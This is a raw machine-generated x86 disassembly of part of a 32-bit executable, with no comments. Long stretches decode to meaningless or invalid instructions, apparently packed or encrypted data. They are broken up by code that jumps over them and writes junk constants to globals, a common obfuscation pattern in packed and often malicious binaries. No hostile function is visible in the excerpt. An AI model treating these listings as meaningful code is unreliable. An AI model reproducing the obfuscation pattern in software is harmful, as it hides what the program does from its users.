  40dbb7:	jne    0x40de3d
  40dbbd:	mov    eax,DWORD PTR [ebp-0x4]
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi+0x1240145c],0xfa21660e
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dc36
  40dbe0:	lods   eax,DWORD PTR ds:[esi]
  40dbe1:	xor    BYTE PTR [esi],0x70
  40dbe4:	cdq    
  40dbe5:	inc    ebp
  40dbe6:	or     eax,0x222b2a1b
  40dbeb:	mov    dl,0x0
  40dbed:	daa    
  40dbee:	add    BYTE PTR [eax],0x79
  40dbf1:	xor    dh,BYTE PTR [eax]
  40dbf3:	or     dl,ch
  40dbf5:	cmp    ah,BYTE PTR [esi-0x1cf48264]
  40dbfb:	xor    eax,0x5864e413
  40dc00:	mov    WORD PTR [ebp+0x279f906d],gs
  40dc06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc07:	xor    DWORD PTR [edx],eax
  40dc09:	fisttp WORD PTR [ecx]
  40dc0b:	test   al,0x29
  40dc0d:	jne    0x40dbdf
  40dc0f:	xor    eax,0x982f6581
  40dc14:	aad    0x67
  40dc16:	sbb    al,BYTE PTR [edi+0x7404725e]
  40dc1c:	add    DWORD PTR [esi-0x5f],edx
  40dc1f:	int3   
  40dc20:	test   al,0x1b
  40dc22:	dec    ebp
  40dc23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc24:	(bad)  
  40dc25:	sbb    al,BYTE PTR [edx]
  40dc27:	rcl    DWORD PTR [ebp-0x79],1
  40dc2a:	fldcw  WORD PTR [eax+edi*8]
  40dc2d:	xlat   BYTE PTR ds:[ebx]
  40dc2e:	pop    ebx
  40dc2f:	or     esi,0xf07bc626
  40dc35:	add    bh,BYTE PTR [edx+ecx*2-0xb]
  40dc39:	sahf   
  40dc3a:	cwde   
  40dc3b:	adc    eax,0x62a1a00e
  40dc40:	pushf  
  40dc41:	jnp    0x40dc0b
  40dc43:	mov    bh,BYTE PTR [ebp-0x48]
  40dc46:	neg    BYTE PTR [eax]
  40dc48:	dec    esp
  40dc49:	call   0x5673d0a3
  40dc4e:	out    dx,al
  40dc4f:	(bad)  
  40dc50:	in     al,dx
  40dc51:	imul   edi,eax,0xffffffd5
  40dc54:	mov    WORD PTR [edx-0x12],es
  40dc57:	xchg   edx,eax
  40dc58:	cmp    eax,0xb8ed52b5
  40dc5d:	mov    ch,0x92
  40dc5f:	leave  
  40dc60:	pop    ebx
  40dc61:	fdiv   DWORD PTR [edi]
  40dc63:	fs sti 
  40dc65:	mov    eax,0xd2e14c3f
  40dc6a:	sbb    al,0x12
  40dc6c:	cdq    
  40dc6d:	jge    0x40dcb6
  40dc6f:	inc    esi
  40dc70:	(bad)  
  40dc71:	cmc    
  40dc72:	mov    ah,0xf
  40dc74:	aas    
  40dc75:	leave  
  40dc76:	jmp    0x83a69613
  40dc7b:	cmp    ecx,esp
  40dc7d:	push   ecx
  40dc7e:	adc    dh,BYTE PTR [esi]
  40dc80:	mov    esp,esi
  40dc82:	sbb    al,0xe7
  40dc84:	xor    ch,BYTE PTR [ebx]
  40dc86:	adc    dh,dh
  40dc88:	outs   dx,BYTE PTR ds:[esi]
  40dc89:	pop    ebp
  40dc8a:	xor    eax,0xd979a26a
  40dc8f:	xchg   BYTE PTR [edx-0x8c16c6c],al
  40dc95:	int    0xcb
  40dc97:	fmul   DWORD PTR [eax]
  40dc99:	xchg   eax,edi
  40dc9b:	and    esp,DWORD PTR [ecx-0x69364509]
  40dca1:	not    ecx
  40dca3:	mov    ah,0x8e
  40dca5:	jge    0x40dc7b
  40dca7:	xor    eax,0xeaa53fcb
  40dcac:	mov    edx,ebx
  40dcae:	stos   BYTE PTR es:[edi],al
  40dcaf:	push   cs
  40dcb0:	and    BYTE PTR [eax+0x1a],ah
  40dcb3:	call   0xb43c:0x6db755ad
  40dcba:	push   cs
  40dcbb:	add    eax,edx
  40dcbd:	push   es
  40dcbe:	pusha  
  40dcbf:	ret    0x1a85
  40dcc2:	ins    DWORD PTR es:[edi],dx
  40dcc3:	dec    ebx
  40dcc4:	mov    ecx,0xeac654ce
  40dcc9:	fistp  DWORD PTR [ebx+ebx*8]
  40dccc:	dec    edi
  40dccd:	xor    eax,0x223b7b9b
  40dcd2:	pop    esp
  40dcd3:	inc    ebx
  40dcd4:	cmp    al,0x3
  40dcd6:	imul   esp,DWORD PTR [ebp+edi*2+0x3cacc5f9],0xe56d537a
  40dce1:	mov    dh,0xe2
  40dce3:	mov    ecx,0x230baa66
  40dce8:	outs   dx,DWORD PTR ds:[esi]
  40dce9:	addr16 pusha 
  40dceb:	push   ss
  40dcec:	and    edi,DWORD PTR [ebx-0x79]
  40dcef:	pop    edi
  40dcf0:	fsub   QWORD PTR [ebp+0x51]
  40dcf3:	mov    al,ds:0x95d6ce43
  40dcf8:	adc    BYTE PTR [ebx-0x55452285],dh
  40dcfe:	or     ch,BYTE PTR [ebx+0x12490eb9]
  40dd04:	mov    al,ds:0x266733a5
  40dd09:	xor    BYTE PTR [edx+esi*2],0x37
  40dd0d:	cli    
  40dd0e:	cmp    edx,edi
  40dd10:	jecxz  0x40dcb4
  40dd12:	jmp    0xcc4b:0xddc2823
  40dd19:	test   eax,0x7aff97be
  40dd1e:	hlt    
  40dd1f:	inc    edi
  40dd20:	(bad)  
  40dd21:	fld    QWORD PTR [edi]
  40dd23:	fadd   st(4),st
  40dd25:	cmp    esi,DWORD PTR [edx+eax*4]
  40dd28:	out    dx,al
  40dd29:	shl    eax,1
  40dd2b:	call   0xbbd9cca
  40dd30:	cmp    BYTE PTR [edi+edx*1+0x7aa26893],bh
  40dd37:	sbb    eax,DWORD PTR [edi]
  40dd39:	jae    0x40dd07
  40dd3b:	inc    ebx
  40dd3c:	dec    esi
  40dd3d:	dec    ebp
  40dd3e:	aaa    
  40dd3f:	push   ds
  40dd40:	aaa    
  40dd41:	or     BYTE PTR [edi+0x5e59c23e],ah
  40dd47:	(bad)  
  40dd48:	jg     0x40dd39
  40dd4a:	jmp    0x9041:0x605d95e0
  40dd51:	add    dh,BYTE PTR [edx]
  40dd53:	mov    ah,0xb3
  40dd55:	ret    0x5f51
  40dd58:	xchg   edi,eax
  40dd59:	jb     0x40dd8b
  40dd5b:	jno    0x40dd11
  40dd5d:	xchg   edx,eax
  40dd5e:	sbb    bh,BYTE PTR [edi-0xf493962]
  40dd64:	sbb    DWORD PTR [edi-0x7c6f5de2],ecx
  40dd6a:	push   ebx
  40dd6b:	pop    esi
  40dd6c:	dec    ebx
  40dd6d:	mov    dh,0x97
  40dd6f:	(bad)  
  40dd70:	lock inc ebx
  40dd72:	xor    edx,ebx
  40dd74:	out    0x56,al
  40dd76:	pop    esp
  40dd77:	adc    al,0x3a
  40dd79:	push   ds
  40dd7a:	jecxz  0x40dd52
  40dd7c:	xchg   DWORD PTR [edx+0x46],eax
  40dd7f:	fisttp DWORD PTR [edi-0x1b68e0cc]
  40dd85:	pop    ebx
  40dd86:	inc    edx
  40dd87:	imul   edi,DWORD PTR [edi+esi*2-0x78],0xffffffeb
  40dd8c:	mov    esi,0x59068d29
  40dd91:	cdq    
  40dd92:	outs   dx,DWORD PTR ds:[esi]
  40dd93:	or     edx,ebp
  40dd95:	hlt    
  40dd96:	retf   
  40dd97:	and    ch,BYTE PTR [ecx-0x14]
  40dd9a:	xchg   esp,eax
  40dd9b:	mov    dl,0x62
  40dd9d:	aad    0x6f
  40dd9f:	mov    WORD PTR [eax-0x5a47240c],cs
  40dda5:	fxtract 
  40dda7:	add    eax,0xa796d986
  40ddac:	mov    edi,0x49be440d
  40ddb1:	pop    edi
  40ddb2:	adc    BYTE PTR [ebp+eiz*1+0x2c0efea9],dh
  40ddb9:	and    dl,BYTE PTR [eax+esi*1]
  40ddbc:	xor    BYTE PTR fs:[ecx-0x6705b01d],cl
  40ddc3:	in     eax,0xca
  40ddc5:	mov    dh,0x25
  40ddc7:	push   cs
  40ddc8:	jmp    0x40dd7e
  40ddca:	stc    
  40ddcb:	mov    ebp,0xe7a3f036
  40ddd0:	iret   
  40ddd1:	dec    eax
  40ddd2:	enter  0x2867,0x15
  40ddd6:	pop    ebx
  40ddd7:	mov    bl,0xd0
  40ddd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddda:	inc    esi
  40dddb:	test   DWORD PTR [ebp-0x79],0x3b11b29d
  40dde2:	inc    ecx
  40dde3:	or     al,BYTE PTR [eax+0x7168082]
  40dde9:	adc    esi,esi
  40ddeb:	pop    esp
  40dded:	mov    cl,0x0
  40ddef:	cmp    esi,eax
  40ddf1:	lds    eax,FWORD PTR [edx]
  40ddf3:	adc    DWORD PTR [ebx-0x4a],ebx
  40ddf6:	inc    esi
  40ddf7:	jp     0x40ddd8
  40ddf9:	mov    eax,0xccfeb6fd
  40ddfe:	popa   
  40ddff:	jmp    0x40de57
  40de01:	ficom  WORD PTR [ebx]
  40de03:	test   DWORD PTR [esp-0x653eec5d],ebx
  40de0a:	(bad)  
  40de0b:	cdq    
  40de0c:	push   ebp
  40de0d:	nop
  40de0e:	div    DWORD PTR [edi+0x1f]
  40de11:	mov    ch,0xa
  40de13:	mov    dh,0x97
  40de15:	cmp    BYTE PTR [edi-0x1e163e5f],ch
  40de1b:	fist   DWORD PTR [ebp-0x39fc9f90]
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43369f,0x0
  40de5a:	mov    eax,ds:0x43369f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43369f,eax
  40de65:	cmp    DWORD PTR ds:0x43369f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43369f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x4336ef,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	idiv   DWORD PTR [ecx]
  40dea7:	push   ebp
  40dea8:	sbb    cl,BYTE PTR ds:0x7e7e9cba
  40deae:	adc    bh,BYTE PTR [edi+0x7e]
  40deb1:	jle    0x40dea4
  40deb3:	ficom  DWORD PTR [edi-0x157ea6c1]
  40deb9:	push   ds
  40deba:	jo     0x40decf
  40debc:	dec    ecx
  40debd:	gs push eax
  40debf:	mov    WORD PTR [ecx+eax*1],ss
  40dec2:	mov    ah,0x2b
  40dec4:	(bad)  [ebp+0xb69092b]
  40deca:	pop    ss
  40decb:	stos   DWORD PTR es:[edi],eax
  40decc:	ret    0x9f23
  40decf:	fmul   DWORD PTR [ecx]
  40ded1:	pop    edx
  40ded2:	repz xchg ecx,eax
  40ded4:	sub    eax,0xd0c21f87
  40ded9:	sub    bh,BYTE PTR [edi-0x7b298047]
  40dedf:	ja     0x40df3a
  40dee1:	lods   eax,DWORD PTR ds:[esi]
  40dee2:	jo     0x40de9b
  40dee4:	shl    DWORD PTR [edx-0x1fcd2b99],0xee
  40deeb:	ror    al,1
  40deed:	mov    bl,0xdf
  40deef:	fldenv [ecx]
  40def1:	call   0xd314:0xe2cdf087
  40def8:	outs   dx,DWORD PTR ds:[esi]
  40def9:	mov    al,0x61
  40defb:	lods   al,BYTE PTR ds:[esi]
  40defc:	mov    al,0x9d
  40defe:	dec    edi
  40deff:	inc    edi
  40df00:	mov    ecx,0x1caf8c9f
  40df05:	pop    ebx
  40df06:	push   ebx
  40df07:	xor    DWORD PTR [edx+ebx*4],0x4c
  40df0b:	sbb    DWORD PTR [ebp+0xb],edi
  40df0e:	sub    BYTE PTR [edi],0x21
  40df11:	out    dx,eax
  40df12:	fcmovb st,st(2)
  40df14:	sbb    ecx,ebp
  40df16:	out    dx,eax
  40df17:	inc    bl
  40df19:	pop    edx
  40df1a:	rcr    DWORD PTR [ebp+ebx*4+0x1df43297],1
  40df21:	hlt    
  40df22:	adc    BYTE PTR [edx],0x6d
  40df25:	fsub   DWORD PTR [edi]
  40df27:	mov    bh,dl
  40df29:	adc    eax,0x7187fa25
  40df2e:	stos   DWORD PTR es:[edi],eax
  40df2f:	xor    bh,BYTE PTR [ebx+esi*8]
  40df32:	icebp  
  40df33:	inc    esp
  40df34:	jae    0x40dec5
  40df36:	imul   edx,DWORD PTR [edx-0x3a4a56da],0x6b
  40df3d:	xchg   edx,eax
  40df3e:	xchg   edx,eax
  40df3f:	cld    
  40df40:	dec    ebp
  40df41:	mov    ds:0xfd6fecbd,al
  40df46:	or     esp,DWORD PTR [ebp+0x27]
  40df49:	out    dx,al
  40df4a:	jg     0x40df40
  40df4c:	dec    ebp
  40df4d:	mov    ebx,0xf82c7c11
  40df52:	fiadd  DWORD PTR [edi-0x2dea385a]
  40df58:	addr16 gs pop ss
  40df5b:	retf   0xcd38
  40df5e:	sahf   
  40df5f:	faddp  st(1),st
  40df61:	lods   eax,DWORD PTR ds:[esi]
  40df62:	stos   DWORD PTR es:[edi],eax
  40df63:	test   cl,0x19
  40df66:	gs pop ecx
  40df68:	xor    cl,bh
  40df6a:	xor    eax,0xa5b2f1c8
  40df6f:	mov    bh,0x40
  40df71:	out    0xcd,eax
  40df73:	enter  0x2a18,0xe9
  40df77:	mov    ecx,0xb9c192f0
  40df7c:	or     BYTE PTR [ebx],ah
  40df7e:	shl    BYTE PTR [edi],cl
  40df80:	mov    esi,0x950eba3b
  40df85:	arpl   WORD PTR fs:[edi],bp
  40df88:	scas   eax,DWORD PTR es:[edi]
  40df89:	inc    ecx
  40df8a:	pop    ds
  40df8b:	xor    DWORD PTR [edx+0x51],ebp
  40df8e:	pushf  
  40df8f:	mov    BYTE PTR ds:0xd9b46c05,dl
  40df95:	bound  ebx,QWORD PTR [ecx+esi*4]
  40df98:	cld    
  40df99:	and    DWORD PTR ds:[ebx],ecx
  40df9c:	push   ss
  40df9d:	lods   al,BYTE PTR ds:[esi]
  40df9e:	sahf   
  40df9f:	fistp  WORD PTR [eax-0x6d]
  40dfa2:	push   es
  40dfa3:	adc    DWORD PTR [edx-0x5c1c8ff8],edx
  40dfa9:	sbb    ah,BYTE PTR [ebx-0x1f]
  40dfac:	loope  0x40dfa0
  40dfae:	fwait
  40dfaf:	popf   
  40dfb0:	mov    al,ds:0x90588979
  40dfb5:	or     ecx,DWORD PTR [edx-0x3c9f42f8]
  40dfbb:	and    BYTE PTR [edi-0x38],ah
  40dfbe:	mov    al,0x3
  40dfc0:	bound  edi,QWORD PTR [edi-0x1a]
  40dfc3:	adc    eax,0x1b53a4f2
  40dfc8:	into   
  40dfc9:	(bad)  
  40dfca:	push   ds
  40dfcb:	push   ds
  40dfcc:	xchg   ebx,eax
  40dfcd:	test   BYTE PTR [ebx+0x2d810845],0x97
  40dfd4:	ss inc ebx
  40dfd6:	add    BYTE PTR ds:0x53000006,ah
  40dfdc:	sub    DWORD PTR ds:0x4336eb,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	cmp    ch,BYTE PTR [ebx]
  40e005:	sub    al,0x5e
  40e007:	pop    esi
  40e008:	popf   
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e086
  40e010:	out    dx,eax
  40e011:	sbb    esi,DWORD PTR [edi]
  40e013:	xor    bl,0x3a
  40e016:	scas   al,BYTE PTR es:[edi]
  40e017:	(bad)  
  40e019:	outs   dx,BYTE PTR ds:[esi]
  40e01a:	xlat   BYTE PTR ds:[ebx]
  40e01b:	xor    ecx,DWORD PTR ds:0xaf565085
  40e021:	rcl    edx,1
  40e023:	int3   
  40e024:	fiadd  WORD PTR [ecx]
  40e026:	xlat   BYTE PTR ds:[ebx]
  40e027:	xor    DWORD PTR [edx+0x9bb2c9],ebp
  40e02d:	icebp  
  40e02e:	xlat   BYTE PTR ds:[ebx]
  40e02f:	mov    ch,0x11
  40e031:	aas    
  40e032:	cmp    cl,BYTE PTR [edi-0x7a7b79ce]
  40e038:	fs dec edi
  40e03a:	sbb    edi,DWORD PTR [eax-0x49]
  40e03d:	jb     0x40e04b
  40e03f:	inc    edi
  40e040:	sub    ebx,0xffffffc9
  40e043:	xchg   edx,eax
  40e044:	aam    0x1e
  40e046:	inc    edx
  40e047:	push   ss
  40e048:	mov    bl,0x75
  40e04a:	sbb    eax,0x45188b58
  40e04f:	retf   
  40e050:	fsubrp st(4),st
  40e052:	bound  ecx,QWORD PTR [edi-0x26b00123]
  40e058:	jnp    0x40e0d1
  40e05a:	(bad)
  40e05d:	scas   eax,DWORD PTR es:[edi]
  40e05e:	div    BYTE PTR [esi+0x2d]
  40e061:	sub    BYTE PTR [esi+0x375cee2d],dh
  40e067:	jmp    0x40e0c6
  40e069:	hlt    
  40e06a:	es mov al,0x76
  40e06d:	daa    
  40e06e:	jmp    0xfb5ad8b9
  40e073:	cli    
  40e074:	std    
  40e075:	das    
  40e076:	jmp    0xf3c3:0x882f08f5
  40e07d:	add    al,0xa8
  40e07f:	lods   al,BYTE PTR ds:[esi]
  40e080:	dec    ecx
  40e081:	stc    
  40e082:	add    eax,0x9c3b00d4
  40e087:	out    dx,eax
  40e088:	mov    bl,BYTE PTR [edi]
  40e08a:	enter  0xb201,0xc0
  40e08e:	jg     0x40e033
  40e090:	jp     0x40e0cd
  40e092:	fs cmp al,0x37
  40e095:	mov    edi,0x9ce4d44f
  40e09a:	ins    BYTE PTR es:[edi],dx
  40e09b:	adc    BYTE PTR [edi],ch
  40e09d:	into   
  40e09e:	pop    esp
  40e09f:	(bad)  
  40e0a0:	jl     0x40e084
  40e0a2:	pop    ebx
  40e0a3:	in     al,0xdd
  40e0a5:	ins    DWORD PTR es:[edi],dx
  40e0a6:	or     eax,0x44d31949
  40e0ab:	dec    ebp
  40e0ac:	xor    eax,0x58849f5b
  40e0b1:	push   eax
  40e0b2:	(bad)  
  40e0b3:	jge    0x40e037
  40e0b5:	lea    ecx,[eax-0x1b7af834]
  40e0bb:	jl     0x40e0b8
  40e0bd:	test   BYTE PTR [esi-0x10],dh
  40e0c0:	in     al,0xfe
  40e0c2:	mov    bl,0xa8
  40e0c4:	cmp    eax,0xc1fac252
  40e0c9:	mov    esp,0x3e6a95cb
  40e0ce:	xor    al,0x43
  40e0d0:	add    edi,DWORD PTR [ebx]
  40e0d2:	mov    bh,0x7a
  40e0d4:	mov    BYTE PTR [ebx+0x30],dh
  40e0d7:	imul   ecx,DWORD PTR ss:[ebx+0x4d50b322],0xb1e0f3e3
  40e0e2:	stos   DWORD PTR es:[edi],eax
  40e0e3:	(bad)  
  40e0e4:	loopne 0x40e137
  40e0e6:	xchg   ebp,eax
  40e0e7:	fld    st(5)
  40e0e9:	mov    ecx,0x953fb215
  40e0ee:	daa    
  40e0ef:	sub    al,BYTE PTR [ebp+0xfefe22]
  40e0f5:	add    edi,DWORD PTR [eax-0x1f]
  40e0f8:	out    0x46,eax
  40e0fa:	das    
  40e0fb:	adc    ecx,DWORD PTR ds:0x2cd31a22
  40e101:	pop    esp
  40e102:	repnz lahf 
  40e104:	mov    al,ds:0x85275219
  40e109:	cld    
  40e10a:	cmc    
  40e10b:	adc    al,0x81
  40e10d:	push   ebp
  40e10e:	or     ebx,DWORD PTR [eax-0x5a677f9f]
  40e114:	add    BYTE PTR [ecx+0x5dc4572e],ch
  40e11a:	add    al,0x65
  40e11c:	test   eax,0xb3c94733
  40e121:	sbb    BYTE PTR [ecx-0xc],ch
  40e124:	outs   dx,BYTE PTR ds:[esi]
  40e125:	mov    ebx,0x5f39e945
  40e12a:	outs   dx,BYTE PTR ds:[esi]
  40e12b:	xor    eax,esi
  40e12d:	adc    DWORD PTR ds:0x4336a3,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x4336ef,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	mov    WORD PTR [ebp+0x7a],fs
  40e15d:	arpl   WORD PTR [edx-0x66],si
  40e160:	jle    0x40e1e0
  40e162:	adc    bh,BYTE PTR [edi+0x7e]
  40e165:	jle    0x40e180
  40e167:	icebp  
  40e168:	adc    DWORD PTR [edx],0xffffffae
  40e16b:	les    esp,FWORD PTR [edi-0x2b]
  40e16e:	push   edi
  40e16f:	xlat   BYTE PTR ds:[ebx]
  40e170:	pushf  
  40e171:	or     esp,edi
  40e173:	pusha  
  40e174:	jo     0x40e186
  40e176:	cmp    DWORD PTR [ebx],ebp
  40e178:	pop    ecx
  40e179:	ins    DWORD PTR es:[edi],dx
  40e17a:	mov    edi,0x7634e60d
  40e17f:	in     al,0xdf
  40e181:	adc    dl,BYTE PTR [ebx+0x3f226a68]
  40e187:	jl     0x40e15a
  40e189:	pop    eax
  40e18a:	call   0xed54fed1
  40e18f:	sub    esi,DWORD PTR [esi+0x32f89ddd]
  40e195:	dec    esp
  40e196:	adc    eax,DWORD PTR [eax+0x4d]
  40e199:	dec    ecx
  40e19a:	xor    al,0x52
  40e19c:	add    bl,BYTE PTR ds:0x140dd111
  40e1a2:	dec    esi
  40e1a3:	xchg   edi,eax
  40e1a4:	adc    DWORD PTR [ebp-0x5cc8ea4a],ebp
  40e1aa:	shl    DWORD PTR [esp+ecx*1],0x38
  40e1ae:	mov    dh,0x7
  40e1b0:	inc    edi
  40e1b1:	push   eax
  40e1b2:	add    al,0xcd
  40e1b4:	mov    ds:0x977a9f6c,al
  40e1b9:	xchg   edi,eax
  40e1ba:	rol    ebp,cl
  40e1bc:	cmp    al,0x34
  40e1be:	pop    edi
  40e1bf:	loope  0x40e207
  40e1c1:	pop    esi
  40e1c2:	aad    0x2a
  40e1c4:	mov    esp,edx
  40e1c6:	test   esp,edi
  40e1c8:	push   edx
  40e1c9:	retf   0xa335
  40e1cc:	jp     0x40e196
  40e1ce:	(bad)
  40e1d2:	mov    cl,0xd2
  40e1d4:	mov    ecx,fs
  40e1d6:	cmp    eax,0x9550054c
  40e1db:	cmp    eax,0xb612e727
  40e1e0:	mov    ch,al
  40e1e2:	jge    0x40e170
  40e1e4:	xchg   esi,eax
  40e1e5:	cmp    ch,BYTE PTR [ebp+ecx*2+0x69ffffff]
  40e1ec:	repnz xor ah,BYTE PTR [edi+0x44502ca1]
  40e1f3:	sbb    DWORD PTR [edi+0x40],esp
  40e1f6:	or     eax,0xdd7f449f
  40e1fb:	retf   
  40e1fc:	pop    ecx
  40e1fd:	stos   BYTE PTR es:[edi],al
  40e1fe:	out    dx,al
  40e1ff:	or     eax,0x2a5f8299
  40e204:	dec    edi
  40e205:	enter  0xaf68,0x69
  40e209:	stc    
  40e20a:	jnp    0x40e24a
  40e20c:	test   DWORD PTR ds:0xcac9ea25,esp
  40e212:	outs   dx,BYTE PTR ds:[esi]
  40e213:	push   0x9287f927
  40e218:	out    0x7e,al
  40e21a:	jmp    0x40e1c5
  40e21c:	popf   
  40e21d:	xor    BYTE PTR ds:0xa06188aa,ch
  40e223:	fcomip st,st(6)
  40e225:	test   esi,esi
  40e227:	sti    
  40e228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e229:	sbb    edi,ebx
  40e22b:	fs dec esp
  40e22d:	dec    ecx
  40e22e:	adc    ecx,eax
  40e230:	je     0x40e229
  40e232:	xor    al,0x89
  40e234:	cdq    
  40e235:	cmp    eax,0x962648e1
  40e23a:	ins    DWORD PTR es:[edi],dx
  40e23b:	pop    es
  40e23c:	sahf   
  40e23d:	outs   dx,DWORD PTR ds:[esi]
  40e23e:	movnti DWORD PTR [edi],eax
  40e241:	pop    edx
  40e242:	lahf   
  40e243:	aad    0xfe
  40e245:	jg     0x40e237
  40e247:	cmp    al,0x35
  40e249:	ja     0x40e2b7
  40e24b:	push   eax
  40e24c:	push   0xffffffd1
  40e24e:	sti    
  40e24f:	dec    eax
  40e250:	push   0xffffffa1
  40e252:	bound  esi,QWORD PTR [edx+edi*4+0x76bcca11]
  40e259:	iret   
  40e25a:	xchg   DWORD PTR [eax+0x60fbe4b2],ebx
  40e260:	add    ecx,DWORD PTR [ebx-0x6d375fe]
  40e266:	lds    ebx,FWORD PTR [esi]
  40e268:	push   edx
  40e269:	adc    al,0x4f
  40e26b:	sub    edi,ebx
  40e26d:	test   esi,eax
  40e26f:	cdq    
  40e270:	inc    eax
  40e271:	das    
  40e272:	adc    DWORD PTR [ecx],edx
  40e274:	dec    esi
  40e275:	out    dx,eax
  40e276:	inc    ebp
  40e277:	popa   
  40e278:	aaa    
  40e279:	or     DWORD PTR [eax+0x2b25ec3a],ebp
  40e27f:	lds    esi,FWORD PTR [ebp+0x16]
  40e282:	mov    DWORD PTR [ebp-0x18],eax
  40e285:	mov    edi,DWORD PTR [ebp+0x8]
  40e288:	inc    DWORD PTR ds:0x43360b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x4336e3,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x43372b
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433697,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43360b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x4336d7,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43369f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43361b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43371f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x43372b,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x4336df,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43371b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x4336d7,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x433653,0x43365f
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x4336a7,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x4336d3,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x4336d7,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433603,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433603,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433697,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433603,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x4336af,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x43372b
  40e3da:	and    DWORD PTR ds:0x43360b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x433663,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433713
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	mov    ds:0x160bb46e,al
  40e419:	cwde   
  40e41a:	jle    0x40e49a
